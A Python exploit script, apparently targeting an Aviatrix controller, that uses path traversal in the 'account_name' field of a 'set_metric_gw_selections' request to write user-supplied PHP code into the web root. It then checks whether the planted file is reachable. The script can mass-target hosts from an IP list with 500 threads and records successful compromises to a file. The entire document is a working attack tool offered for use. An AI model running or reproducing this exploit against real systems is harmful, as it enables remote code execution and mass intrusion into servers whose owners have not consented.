import requests
from requests.structures import CaseInsensitiveDict
from colorama import Fore, Style
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import thread
import threading
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exploit(url,path,code):
    lock = threading.Lock()
    headers = CaseInsensitiveDict()
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'
    }
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    data = f'CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{path}.php&data={code}'
    resp = requests.post(url, headers=headers, data=data,verify=False,timeout=10)
    stat = requests.get(url+"/v1/"+path,verify=False,timeout=10)
    if resp.status_code==200:
        if stat.status_code==200:
            print(f"[ {Fore.RED} Exploited {Fore.BLACK}] [{Fore.GREEN}{url}/v1/{path}{Fore.BLACK} ]")
            lock.acquire()
            with open("success.txt","a")as f_1:
                f_1.write(url+"/v1/"+path+"\n")
            lock.release()
        else:
            print("[ Exploit successful Creating File Failed ]")
            pass
    else:
        print(f'[{Fore.BLUE} Exploit Unsuccessful {Fore.BLUE}]')

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("-u", "--url", help="Enter Target Url With scheme Ex: -u https://avaitix.target.com",
                            type=str)
        parser.add_argument("-f", "--file", help="Enter the ip file",type=str)
        parser.add_argument("-c", "--code", help="Enter php code Ex: -c '<?php phpinfo(); ?>' ", type=str)
        parser.add_argument("-n", "--name", help="Enter php code Ex: -n 'filename' ", type=str)
        args = parser.parse_args()
        url = f"{args.url}/v1/backend1"
    except TypeError:
        print("Type -h To See all the options")
    except():
        exit()

    pool = thread.ThreadPoolExecutor(max_workers=500)
    if args.url and args.name and args.code:
        exploit(args.url,args.name,args.code)
    elif args.file and args.name and args.code:
        with open(args.file,"r")as f:
            for url in f:
                url_1 = url.strip()
                pool.submit(exploit,(url_1),(args.name),(args.code))
    else:
        print("Type -h To See all the options")


